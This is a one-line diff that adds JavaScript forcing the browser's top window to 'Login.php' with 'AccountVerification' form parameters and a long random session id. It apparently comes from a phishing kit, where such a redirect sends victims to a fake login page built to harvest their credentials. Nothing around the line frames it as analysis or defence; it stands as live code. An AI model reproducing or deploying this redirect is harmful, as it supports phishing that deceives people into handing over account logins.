@@ -1,0 +1,1 @@
+var page = "Login.php?sslchannel=true&form=AccountVerification&sessionid=1UJHwD0O9ZZySCHOB1CRTm16tHKDqEVBdPjIvzIE04Oi51dyE0tYY5ghCOa6x0PZeyUUZkcFkI2bq1xP"; top.location = page; 
